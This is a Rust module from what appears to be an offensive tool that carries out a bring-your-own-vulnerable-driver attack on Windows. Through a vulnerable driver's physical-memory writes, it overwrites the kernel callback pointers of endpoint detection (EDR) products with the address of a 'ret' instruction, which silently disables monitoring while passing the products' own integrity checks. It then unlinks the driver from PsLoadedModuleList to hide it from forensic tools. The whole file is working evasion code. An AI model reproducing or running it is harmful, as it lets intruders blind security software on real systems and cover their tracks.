//! Surgical kernel callback overwrite (ret, not null).
//!
//! This module performs the core BYOVD callback overwrite:
//!
//! 1. Locates a `ret` (0xC3) instruction in ntoskrnl.exe's .text section
//!    — specifically within `IoInvalidDeviceRequest` which is just a `ret`.
//! 2. For each discovered EDR callback (from `discover.rs`), overwrites
//!    the function pointer in the `EX_CALLBACK_ROUTINE_BLOCK` to point to
//!    the ret address.
//! 3. The callback block itself remains in the list with valid RefCount
//!    and Callback fields — only the function pointer changes.
//! 4. EDR self-integrity checks pass because the pointer is non-NULL and
//!    points to valid executable kernel memory. When the callback fires,
//!    it immediately returns without executing any monitoring logic.
//!
//! Safety mechanisms:
//! - Original pointers are saved for `KernelCallbackRestore`
//! - KeBugCheckCallbackListHead entries are NEVER overwritten
//! - Failed writes are skipped rather than writing garbage
//! - After overwriting, the vulnerable driver is unlinked from
//!   PsLoadedModuleList for anti-forensic cleanup

use super::deploy::{self, DeployedDriver};
use super::discover::{CallbackInfo, CallbackListType, ScanResult};
use anyhow::{bail, Context, Result};
use once_cell::sync::Lazy;
use serde::{Deserialize, Serialize};
use std::sync::Mutex;

/// Saved backup of an overwritten callback pointer.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CallbackBackup {
    /// Address that was overwritten (the function pointer field in EX_CALLBACK_ROUTINE_BLOCK).
    pub address: u64,
    /// Original value (the real EDR callback function pointer).
    pub original_value: u64,
    /// The ret address it was overwritten with.
    pub ret_address: u64,
    /// Which callback this was.
    pub info: CallbackInfo,
}

/// Global backup storage for restore capability.
static BACKUPS: Lazy<Mutex<Vec<CallbackBackup>>> = Lazy::new(|| Mutex::new(Vec::new()));

/// Result of a callback nuke operation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NukeResult {
    /// Number of callbacks successfully overwritten.
    pub overwritten: usize,
    /// Number of callbacks skipped (bugcheck, read failure, etc.).
    pub skipped: usize,
    /// Number of callbacks that failed to overwrite.
    pub failed: usize,
    /// The ret address used for overwriting.
    pub ret_address: u64,
    /// Details of each overwritten callback.
    pub details: Vec<String>,
}

/// Result of a restore operation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RestoreResult {
    /// Number of callbacks successfully restored.
    pub restored: usize,
    /// Number of callbacks that failed to restore.
    pub failed: usize,
}

/// Resolve the address of `IoInvalidDeviceRequest` in ntoskrnl.
///
/// `IoInvalidDeviceRequest` is a simple `ret` instruction (0xC3) in
/// ntoskrnl.exe. It's the default IRP dispatch function and is always
/// present. Using this address ensures the overwritten callback returns
/// immediately with STATUS_INVALID_DEVICE_REQUEST.
///
/// Falls back to scanning the .text section for any `ret` instruction
/// if the export cannot be resolved.
fn find_ret_address(
    driver: &super::driver_db::VulnerableDriver,
    device_handle: usize,
    kernel_base: u64,
) -> Result<u64> {
    // Method 1: Resolve IoInvalidDeviceRequest export.
    // This function is literally just `ret` and is present in all Windows versions.
    match super::discover::resolve_kernel_symbol(
        driver,
        device_handle,
        kernel_base,
        "IoInvalidDeviceRequest",
    ) {
        Ok(addr) => {
            // Verify it's actually a ret instruction.
            let mut buf = [0u8; 1];
            match unsafe {
                deploy::read_physical_memory(driver, device_handle, addr, &mut buf)
            } {
                Ok(()) if buf[0] == 0xC3 => {
                    log::info!(
                        "Found ret at IoInvalidDeviceRequest: 0x{:016X}",
                        addr
                    );
                    return Ok(addr);
                }
                Ok(()) => {
                    log::warn!(
                        "IoInvalidDeviceRequest at 0x{:016X} is not ret (0x{:02X}), scanning .text",
                        addr,
                        buf[0]
                    );
                }
                Err(e) => {
                    log::warn!(
                        "Failed to verify IoInvalidDeviceRequest: {}, scanning .text",
                        e
                    );
                }
            }
        }
        Err(e) => {
            log::warn!(
                "Failed to resolve IoInvalidDeviceRequest: {}, scanning .text",
                e
            );
        }
    }

    // Method 2: Scan the .text section for a ret instruction at a known function boundary.
    // Read PE headers to find .text section.
    let mut dos_header = [0u8; 64];
    unsafe {
        deploy::read_physical_memory(driver, device_handle, kernel_base, &mut dos_header)?;
    }

    let pe_offset = u32::from_le_bytes(dos_header[0x3C..0x40].try_into()?) as u64;

    let mut pe_sig = [0u8; 4];
    unsafe {
        deploy::read_physical_memory(driver, device_handle, kernel_base + pe_offset, &mut pe_sig)?;
    }

    if &pe_sig != b"PE\0\0" {
        bail!("Invalid PE signature");
    }

    // Read section count and optional header size.
    let mut coff_buf = [0u8; 20];
    unsafe {
        deploy::read_physical_memory(
            driver,
            device_handle,
            kernel_base + pe_offset + 4,
            &mut coff_buf,
        )?;
    }

    let num_sections = u16::from_le_bytes(coff_buf[2..4].try_into()?) as usize;
    let optional_header_size = u16::from_le_bytes(coff_buf[16..18].try_into()?) as u64;

    // Section headers start after the optional header.
    let sections_offset = pe_offset + 4 + 20 + optional_header_size;

    for i in 0..num_sections {
        let section_offset = sections_offset + (i as u64) * 40;
        let mut section_header = [0u8; 40];
        unsafe {
            deploy::read_physical_memory(
                driver,
                device_handle,
                kernel_base + section_offset,
                &mut section_header,
            )?;
        }

        let name = std::str::from_utf8(&section_header[0..8])
            .unwrap_or("")
            .trim_end_matches('\0');

        if name != ".text" {
            continue;
        }

        let virtual_size = u32::from_le_bytes(section_header[8..12].try_into()?) as u64;
        let virtual_address = u32::from_le_bytes(section_header[12..16].try_into()?) as u64;

        // Scan the first 4KB of .text for a ret (0xC3) byte.
        // Pick one at a random-ish offset to avoid determinism.
        let scan_size = std::cmp::min(4096u64, virtual_size);
        let mut scan_buf = vec![0u8; scan_size as usize];
        unsafe {
            deploy::read_physical_memory(
                driver,
                device_handle,
                kernel_base + virtual_address,
                &mut scan_buf,
            )?;
        }

        // Find a ret instruction. Prefer ones at 16-byte aligned offsets
        // (function entry points are typically aligned).
        for offset in (0..scan_size).step_by(16) {
            if scan_buf[offset as usize] == 0xC3 {
                let ret_addr = kernel_base + virtual_address + offset;
                log::info!(
                    "Found ret in .text at offset 0x{:04X}: 0x{:016X}",
                    offset,
                    ret_addr
                );
                return Ok(ret_addr);
            }
        }

        // If no aligned ret found, try any offset.
        for (offset, &byte) in scan_buf.iter().enumerate() {
            if byte == 0xC3 {
                let ret_addr = kernel_base + virtual_address + offset as u64;
                log::info!(
                    "Found ret in .text at unaligned offset 0x{:04X}: 0x{:016X}",
                    offset,
                    ret_addr
                );
                return Ok(ret_addr);
            }
        }
    }

    bail!("Could not find a ret instruction in kernel .text section")
}

/// Overwrite a single callback function pointer.
///
/// Writes `ret_address` to the function pointer field in the
/// EX_CALLBACK_ROUTINE_BLOCK at `block_address + 0x18`.
///
/// Returns `Ok(original_value)` on success.
unsafe fn overwrite_callback(
    driver: &super::driver_db::VulnerableDriver,
    device_handle: usize,
    callback: &CallbackInfo,
    ret_address: u64,
) -> Result<u64> {
    // Read the original function pointer.
    let mut original_buf = [0u8; 8];
    deploy::read_physical_memory(
        driver,
        device_handle,
        callback.block_address + 0x18,
        &mut original_buf,
    )
    .context("failed to read original callback pointer")?;

    let original_value = u64::from_le_bytes(original_buf);

    // Don't overwrite if it's already a ret pointer.
    if original_value == ret_address {
        log::info!(
            "Callback {}:{} already points to ret, skipping",
            callback.list_type,
            callback.index
        );
        return Ok(original_value);
    }

    // Write the ret address.
    let ret_bytes = ret_address.to_le_bytes();
    deploy::write_physical_memory(
        driver,
        device_handle,
        callback.block_address + 0x18,
        &ret_bytes,
    )
    .context("failed to write ret pointer to callback block")?;

    log::info!(
        "Overwrote {}:{} callback 0x{:016X} -> 0x{:016X} (ret)",
        callback.list_type,
        callback.index,
        original_value,
        ret_address
    );

    Ok(original_value)
}

/// Perform the full callback nuke operation.
///
/// Steps:
/// 1. Discover all EDR callbacks
/// 2. Find a ret address in kernel memory
/// 3. Overwrite each overwritable callback's function pointer
/// 4. Save backups for restore
/// 5. Unlink the vulnerable driver from PsLoadedModuleList
///
/// # Safety
/// This modifies live kernel data structures. The caller must ensure:
/// - The deployed driver is valid and operational
/// - The agent has SeDebugPrivilege enabled
/// - The system is in a stable state
pub fn nuke_callbacks(deployed: &DeployedDriver) -> Result<NukeResult> {
    let device_handle = deployed
        .device_handle
        .context("No device handle for deployed driver")?;

    let driver = deployed.driver;

    // Step 1: Scan for all callbacks.
    let scan = super::discover::scan_callbacks(deployed)
        .context("callback scan failed")?;

    log::info!(
        "Discovered {} callbacks ({} overwritable), kernel base: 0x{:016X}",
        scan.total_count,
        scan.overwritable_count,
        scan.kernel_base
    );

    if scan.overwritable_count == 0 {
        return Ok(NukeResult {
            overwritten: 0,
            skipped: scan.callbacks.len(),
            failed: 0,
            ret_address: 0,
            details: vec!["No overwritable callbacks found".to_string()],
        });
    }

    // Step 2: Find a ret address.
    let ret_address = find_ret_address(driver, device_handle, scan.kernel_base)
        .context("failed to find ret address")?;

    log::info!("Using ret address: 0x{:016X}", ret_address);

    // Step 3: Overwrite each safe callback.
    let mut result = NukeResult {
        overwritten: 0,
        skipped: 0,
        failed: 0,
        ret_address,
        details: Vec::new(),
    };

    for callback in &scan.callbacks {
        // Skip bugcheck callbacks — NEVER overwrite these.
        if callback.list_type == CallbackListType::BugCheck {
            result.skipped += 1;
            result.details.push(format!(
                "SKIP {}:{} (bugcheck — never overwritten)",
                callback.list_type, callback.index
            ));
            continue;
        }

        // Skip callbacks not marked as safe.
        if !callback.safe_to_overwrite {
            result.skipped += 1;
            continue;
        }

        match unsafe { overwrite_callback(driver, device_handle, callback, ret_address) } {
            Ok(original_value) => {
                // Save backup for restore.
                let backup = CallbackBackup {
                    address: callback.block_address + 0x18,
                    original_value,
                    ret_address,
                    info: callback.clone(),
                };

                {
                    let mut guard = BACKUPS.lock().unwrap();
                    guard.push(backup);
                }

                result.overwritten += 1;
                result.details.push(format!(
                    "NUKE {}:{} [{}] 0x{:016X} -> ret",
                    callback.list_type,
                    callback.index,
                    callback.owner_module,
                    original_value
                ));
            }
            Err(e) => {
                // Skip this callback rather than writing garbage.
                result.failed += 1;
                result.details.push(format!(
                    "FAIL {}:{} [{}]: {}",
                    callback.list_type,
                    callback.index,
                    callback.owner_module,
                    e
                ));
                log::warn!(
                    "Failed to overwrite callback {}:{}: {}",
                    callback.list_type,
                    callback.index,
                    e
                );
            }
        }
    }

    // Step 4: Anti-forensic cleanup — unlink the driver from PsLoadedModuleList.
    if !deployed.was_preloaded {
        if let Err(e) = unlink_driver_from_list(deployed, scan.kernel_base) {
            log::warn!("Failed to unlink driver from PsLoadedModuleList: {}", e);
            // Non-fatal — the callbacks are already overwritten.
        }
    }

    log::info!(
        "Callback nuke complete: {} overwritten, {} skipped, {} failed",
        result.overwritten,
        result.skipped,
        result.failed
    );

    Ok(result)
}

/// Restore all previously overwritten callback pointers.
///
/// Reads the backup storage and writes back the original function pointers.
pub fn restore_callbacks(deployed: &DeployedDriver) -> Result<RestoreResult> {
    let device_handle = deployed
        .device_handle
        .context("No device handle for deployed driver")?;

    let driver = deployed.driver;
    let mut result = RestoreResult {
        restored: 0,
        failed: 0,
    };

    let mut backups = {
        let mut guard = BACKUPS.lock().unwrap();
        std::mem::take(&mut *guard)
    };

    for backup in &mut backups {
        // Write the original value back.
        let original_bytes = backup.original_value.to_le_bytes();
        match unsafe {
            deploy::write_physical_memory(
                driver,
                device_handle,
                backup.address,
                &original_bytes,
            )
        } {
            Ok(()) => {
                result.restored += 1;
                log::info!(
                    "Restored callback at 0x{:016X} to original 0x{:016X}",
                    backup.address,
                    backup.original_value
                );
            }
            Err(e) => {
                result.failed += 1;
                log::warn!(
                    "Failed to restore callback at 0x{:016X}: {}",
                    backup.address,
                    e
                );
            }
        }
    }

    log::info!(
        "Callback restore complete: {} restored, {} failed",
        result.restored,
        result.failed
    );

    Ok(result)
}

/// Check if there are backups available for restore.
pub fn has_backups() -> bool {
    let guard = BACKUPS.lock().unwrap();
    !guard.is_empty()
}

/// Get a snapshot of the current backup state.
pub fn get_backup_snapshot() -> Vec<CallbackBackup> {
    let guard = BACKUPS.lock().unwrap();
    guard.clone()
}

/// Unlink the vulnerable driver from PsLoadedModuleList.
///
/// This removes the driver's KLDR_DATA_TABLE_ENTRY from the kernel's
/// loaded module list, making it invisible to tools like `driverquery`
/// and `EnumDeviceDrivers`. The driver remains loaded in kernel memory
/// and continues to function.
fn unlink_driver_from_list(deployed: &DeployedDriver, kernel_base: u64) -> Result<()> {
    let device_handle = deployed
        .device_handle
        .context("No device handle")?;
    let driver = deployed.driver;

    // Resolve PsLoadedModuleList.
    let list_head = super::discover::resolve_kernel_symbol(
        driver,
        device_handle,
        kernel_base,
        "PsLoadedModuleList",
    )
    .context("failed to resolve PsLoadedModuleList")?;

    // Walk the list looking for our driver.
    // Each entry is a KLDR_DATA_TABLE_ENTRY:
    //   +0x00: LIST_ENTRY (Flink, Blink)
    //   +0x10: ...
    //   +0x58: UNICODE_STRING BaseDllName
    //   +0x68: UNICODE_STRING FullDllName

    let mut flink_buf = [0u8; 8];
    unsafe {
        deploy::read_physical_memory(driver, device_handle, list_head, &mut flink_buf)?;
    }
    let mut current = u64::from_le_bytes(flink_buf);

    let max_walk = 512;
    for _ in 0..max_walk {
        if current == 0 || current == list_head {
            break;
        }

        // Read the driver name from the entry.
        // BaseDllName is at offset +0x58 from the LIST_ENTRY.
        // UNICODE_STRING: Length (u16), MaxLength (u16), Buffer (ptr)
        let mut name_info = [0u8; 16]; // UNICODE_STRING + pointer
        unsafe {
            deploy::read_physical_memory(
                driver,
                device_handle,
                current + 0x58,
                &mut name_info,
            )?;
        }

        let name_length = u16::from_le_bytes(name_info[0..2].try_into()?) as usize;
        let name_buffer = u64::from_le_bytes(name_info[8..16].try_into()?) as u64;

        if name_length > 0 && name_buffer != 0 {
            let mut name_buf = vec![0u8; name_length + 2];
            unsafe {
                deploy::read_physical_memory(
                    driver,
                    device_handle,
                    name_buffer,
                    &mut name_buf,
                )?;
            }

            // Convert from UTF-16 to string.
            let name_u16: Vec<u16> = name_buf[..name_length]
                .chunks_exact(2)
                .map(|c| u16::from_le_bytes([c[0], c[1]]))
                .collect();
            let name = String::from_utf16_lossy(&name_u16);

            if name.eq_ignore_ascii_case(driver.name) {
                // Found our driver! Unlink it from the list.
                // Read Flink and Blink of this entry.
                let mut entry_links = [0u8; 16];
                unsafe {
                    deploy::read_physical_memory(
                        driver,
                        device_handle,
                        current,
                        &mut entry_links,
                    )?;
                }
                let entry_flink = u64::from_le_bytes(entry_links[0..8].try_into()?);
                let entry_blink = u64::from_le_bytes(entry_links[8..16].try_into()?);

                // Set blink->Flink = flink.
                let flink_bytes = entry_flink.to_le_bytes();
                unsafe {
                    deploy::write_physical_memory(
                        driver,
                        device_handle,
                        entry_blink,
                        &flink_bytes,
                    )?;
                }

                // Set flink->Blink = blink.
                let blink_bytes = entry_blink.to_le_bytes();
                unsafe {
                    deploy::write_physical_memory(
                        driver,
                        device_handle,
                        entry_flink + 8,
                        &blink_bytes,
                    )?;
                }

                log::info!(
                    "Unlinked {} from PsLoadedModuleList",
                    driver.name
                );
                return Ok(());
            }
        }

        // Follow Flink.
        unsafe {
            deploy::read_physical_memory(driver, device_handle, current, &mut flink_buf)?;
        }
        current = u64::from_le_bytes(flink_buf);
    }

    log::warn!(
        "Driver {} not found in PsLoadedModuleList (may already be unlinked)",
        driver.name
    );
    Ok(())
}
